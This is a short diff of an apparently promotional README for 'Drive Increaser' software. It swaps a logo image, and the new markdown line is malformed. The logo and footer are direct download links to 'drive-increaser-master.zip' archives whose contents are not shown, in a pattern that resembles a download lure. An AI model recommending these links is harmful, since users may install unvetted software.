@@ -10,7 +10,7 @@
 
 
 
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/drive%20increaser.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/Screenshot-2018-5-2%20Free%20Online%20Logo%20Maker%2C%20Create%20Custom%20Logo%20Designs%20-%20DesignEvo.png](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
 
 
 © 2002-2018 The Drive Increaser LLC. All Rights Reserved. https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/drive-increaser-master.zip
